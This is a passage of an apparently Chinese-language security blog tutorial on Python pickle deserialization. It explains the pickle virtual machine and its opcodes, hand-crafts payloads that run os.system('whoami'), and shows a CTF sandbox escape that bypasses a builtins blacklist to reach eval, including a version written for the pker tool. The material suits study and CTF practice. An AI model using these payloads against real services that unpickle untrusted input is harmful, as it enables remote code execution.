Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/Users/theoyu/workspace/python/pickle/main.py"</span>, line 32, <span class="k">in</span> &lt;module&gt;
    restricted_loads<span class="o">(</span><span class="nb">test</span><span class="o">)</span>
  File <span class="s2">"/Users/theoyu/workspace/python/pickle/main.py"</span>, line 28, <span class="k">in </span>restricted_loads
    <span class="k">return </span>RestrictedUnpickler<span class="o">(</span>io.BytesIO<span class="o">(</span>s<span class="o">))</span>.load<span class="o">()</span>
  File <span class="s2">"/Users/theoyu/workspace/python/pickle/main.py"</span>, line 22, <span class="k">in </span>find_class
    raise pickle.UnpicklingError<span class="o">(</span><span class="s2">"global '%s.%s' is forbidden"</span> %
_pickle.UnpicklingError: global <span class="s1">'os.system'</span> is forbidden
</code></pre></div></div>

<p>而出题的话，当然不会直接限制死，往往都是黑名单漏几个，白名单多几个，去构造。这就需要我们手撕opcode，因为<code class="language-plaintext highlighter-rouge">__reduce__</code>只能返回一个元祖，沙盒逃逸的情况往往都是一长串的。</p>

<p>要解析opcode自然离不开PVM(Pickle Virtual Machine)，pvm涉及到三个部分：</p>

<ul>
  <li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code class="language-plaintext highlighter-rouge">.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
  <li>栈区：最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护<strong>最顶层的信息</strong>，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。</li>
  <li>存储区(memo)：将反序列化完成的数据以 <code class="language-plaintext highlighter-rouge">key-value</code> 的形式储存在memo中，以便后来使用。大多数情况，我们并不需要用到这个部分。</li>
</ul>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815155926.png" alt="" /></p>

<p>Pickletools是一个利于我们反汇编pickle的工具，举一个例子看看</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pickletools</span>
<span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,(</span><span class="s">'whoami'</span><span class="p">,))</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">exp</span><span class="p">()</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
<span class="n">pickletools</span><span class="p">.</span><span class="n">dis</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</code></pre></div></div>

<p>同时，<code class="language-plaintext highlighter-rouge">pickle.dumps</code>一共有6种形式，其中版本0最利于我们观察，越往后为了效率增加了很多字符，不过好在load是向前兼容的，所以我们后面的分析都采用版本0</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cposix
system
p0
<span class="o">(</span>Vwhoami
p1
tp2
Rp3
<span class="nb">.</span>
    0: c    GLOBAL     <span class="s1">'posix system'</span>
   14: p    PUT        0
   17: <span class="o">(</span>    MARK
   18: V        UNICODE    <span class="s1">'whoami'</span>
   26: p        PUT        1
   29: t        TUPLE      <span class="o">(</span>MARK at 17<span class="o">)</span>
   30: p    PUT        2
   33: R    REDUCE
   34: p    PUT        3
   37: <span class="nb">.</span>    STOP
highest protocol among opcodes <span class="o">=</span> 0

</code></pre></div></div>

<p>关于opcode的语法，官方<a href="https://github.com/python/cpython/blob/3.8/Lib/pickle.py">源码</a>有点含糊，不过有师傅总结下来了：</p>

<table>
  <thead>
    <tr>
      <th>opcode</th>
      <th>描述</th>
      <th>具体写法</th>
      <th>栈上的变化</th>
      <th>memo上的变化</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>c</td>
      <td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
      <td>c[module]\n[instance]\n</td>
      <td>获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>o</td>
      <td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
      <td>o</td>
      <td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>i</td>
      <td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
      <td>i[module]\n[callable]\n</td>
      <td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>N</td>
      <td>实例化一个None</td>
      <td>N</td>
      <td>获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>S</td>
      <td>实例化一个字符串对象</td>
      <td>S’xxx’\n（也可以使用双引号、'等python字符串形式）</td>
      <td>获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>V</td>
      <td>实例化一个UNICODE字符串对象</td>
      <td>Vxxx\n</td>
      <td>获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>I</td>
      <td>实例化一个int对象</td>
      <td>Ixxx\n</td>
      <td>获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>F</td>
      <td>实例化一个float对象</td>
      <td>Fx.x\n</td>
      <td>获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>R</td>
      <td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
      <td>R</td>
      <td>函数和参数出栈，函数的返回值入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>.</td>
      <td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
      <td>.</td>
      <td>无</td>
      <td>无</td>
    </tr>
    <tr>
      <td>(</td>
      <td>向栈中压入一个MARK标记</td>
      <td>(</td>
      <td>MARK标记入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>t</td>
      <td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
      <td>t</td>
      <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>)</td>
      <td>向栈中直接压入一个空元组</td>
      <td>)</td>
      <td>空元组入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>l</td>
      <td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
      <td>l</td>
      <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>]</td>
      <td>向栈中直接压入一个空列表</td>
      <td>]</td>
      <td>空列表入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>d</td>
      <td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
      <td>d</td>
      <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>}</td>
      <td>向栈中直接压入一个空字典</td>
      <td>}</td>
      <td>空字典入栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>p</td>
      <td>将栈顶对象储存至memo_n</td>
      <td>pn\n</td>
      <td>无</td>
      <td>对象被储存</td>
    </tr>
    <tr>
      <td>g</td>
      <td>将memo_n的对象压栈</td>
      <td>gn\n</td>
      <td>对象被压栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>0</td>
      <td>丢弃栈顶对象</td>
      <td>0</td>
      <td>栈顶对象被丢弃</td>
      <td>无</td>
    </tr>
    <tr>
      <td>b</td>
      <td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
      <td>b</td>
      <td>栈上第一个元素出栈</td>
      <td>无</td>
    </tr>
    <tr>
      <td>s</td>
      <td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
      <td>s</td>
      <td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
      <td>无</td>
    </tr>
    <tr>
      <td>u</td>
      <td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
      <td>u</td>
      <td>MARK标记以及被组合的数据出栈，字典被更新</td>
      <td>无</td>
    </tr>
    <tr>
      <td>a</td>
      <td>将栈的第一个元素append到第二个元素(列表)中</td>
      <td>a</td>
      <td>栈顶元素出栈，第二个元素（列表）被更新</td>
      <td>无</td>
    </tr>
    <tr>
      <td>e</td>
      <td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
      <td>e</td>
      <td>MARK标记以及被组合的数据出栈，列表被更新</td>
      <td>无</td>
    </tr>
  </tbody>
</table>

<p>结合语法，重新分析一下opcode</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    0: c    GLOBAL     <span class="s1">'posix system  '</span> <span class="c">#对象入栈 unix为posix windows为nt</span>
   14: p    PUT        0 						  	<span class="c">#存储到memo的0位置</span>
   17: <span class="o">(</span>    MARK  									    <span class="c">#向栈中压入一个MARK标记 左括号标志符</span>
   18: V        UNICODE    <span class="s1">'whoami'</span>     <span class="c">#压入一个字符串</span>
   26: p        PUT        1            <span class="c">#存储到memo的1位置</span>
   29: t        TUPLE      <span class="o">(</span>MARK at 17<span class="o">)</span> <span class="c">#在栈中寻找上一个MARK标记，将其和中间内容出栈，参数形成元祖入栈</span>
   30: p    PUT        2							  <span class="c">#存储到memo的2位置</span>
   33: R    REDUCE											<span class="c"># system("whoami")出栈，结果如栈</span>
   34: p    PUT        3								<span class="c"># 结果存储到memo3</span>
   37: <span class="nb">.</span>    STOP												<span class="c"># 停止</span>
</code></pre></div></div>

<p>结合语法来说的话，还是可以理解了，加上memo上的操作可以省略，简化为：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="nn">pickle</span>
 
 <span class="n">a</span><span class="o">=</span><span class="s">'''cposix
 system
 (Vwhoami
 tR.'''</span>
 
 <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 <span class="n">pickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
 
 <span class="c1">#theoyu
</span></code></pre></div></div>

<p>上面用了<strong>R</strong>做了函数执行，同时<strong>i</strong>，<strong>o</strong>稍作修改也可以达到一样的效果</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># o
</span><span class="s">'''(cos
system
S'whoami'
o.'''</span>
<span class="n">pickletools</span><span class="o">-&gt;</span>
    <span class="mi">0</span><span class="p">:</span> <span class="p">(</span>    <span class="n">MARK</span>
    <span class="mi">1</span><span class="p">:</span> <span class="n">c</span>        <span class="n">GLOBAL</span>     <span class="s">'os system'</span>
   <span class="mi">12</span><span class="p">:</span> <span class="n">S</span>        <span class="n">STRING</span>     <span class="s">'whoami'</span>
   <span class="mi">22</span><span class="p">:</span> <span class="n">o</span>        <span class="n">OBJ</span>        <span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
   <span class="mi">23</span><span class="p">:</span> <span class="p">.</span>    <span class="n">STOP</span>


<span class="c1"># i
</span><span class="s">'''(S'whoami'
ios
system
.'''</span>
<span class="n">pickletools</span><span class="o">-&gt;</span>
    <span class="mi">0</span><span class="p">:</span> <span class="p">(</span>    <span class="n">MARK</span>
    <span class="mi">1</span><span class="p">:</span> <span class="n">S</span>        <span class="n">STRING</span>     <span class="s">'whoami'</span>
   <span class="mi">11</span><span class="p">:</span> <span class="n">i</span>        <span class="n">INST</span>       <span class="s">'os system'</span> <span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
   <span class="mi">22</span><span class="p">:</span> <span class="p">.</span>    <span class="n">STOP</span>

</code></pre></div></div>

<p>拿p神经典的code_break试试：</p>

<ul>
  <li>模块白名单：<code class="language-plaintext highlighter-rouge">builtins</code></li>
  <li>子模块黑名单：<code class="language-plaintext highlighter-rouge">'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'</code></li>
</ul>

<p>因为只禁用了子模块，我们可以先通过一轮global+get重新筛选出builtins，再构造即可。</p>

<p>先构造<code class="language-plaintext highlighter-rouge">__builtins__.globals().get('__builtins__')</code>拿到可以执行eval的builtins,再执行<code class="language-plaintext highlighter-rouge">builtins.getattr(builtins, 'eval'),('__import__("os").system("whoami")',)</code>即可。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cbuiltins</span>
<span class="nb">getattr</span>
<span class="p">(</span><span class="n">cbuiltins</span>
<span class="nb">getattr</span>
<span class="p">(</span><span class="n">cbuiltins</span>
<span class="nb">dict</span>
<span class="n">S</span><span class="s">'get'</span>
<span class="n">tR</span><span class="p">(</span><span class="n">cbuiltins</span>
<span class="nb">globals</span>
<span class="p">(</span><span class="n">tRS</span><span class="s">'__builtins__'</span>   <span class="c1">#拿到bultins
</span><span class="n">tRS</span><span class="s">'eval'</span>
<span class="n">tRp1</span>
<span class="p">(</span><span class="n">S</span><span class="s">'__import__("os").system("whoami")'</span>
<span class="n">tR</span><span class="p">.</span>
</code></pre></div></div>

<p>不过这样看起来还是有一些费劲的,学长@iv4n写的<a href="https://github.com/eddieivan01/pker">pker</a>利用遍历AST结点自动化构建解决了这个问题</p>

<p>上述例子只需要构造：</p>

<pre><code class="language-pker">getattr = GLOBAL('builtins', 'getattr')
dict = GLOBAL('builtins', 'dict')
dict_get = getattr(dict, 'get')
globals = GLOBAL('builtins', 'globals')
builtins = globals()
__builtins__ = dict_get(builtins, '__builtins__')
eval = getattr(__builtins__, 'eval')
eval('__import__("os").system("whoami")')
return
</code></pre>

<p>其中</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
</code></pre></div></div>

<p>即可生成opcode。</p>

<p>参考：</p>

<ul>
  <li><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a></li>
  <li><a href="https://xz.aliyun.com/t/7012#toc-0">通过AST来构造Pickle opcode</a></li>
  <li><a href="https://github.com/eddieivan01/pker">pker</a></li>
</ul>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[]]></summary></entry></feed>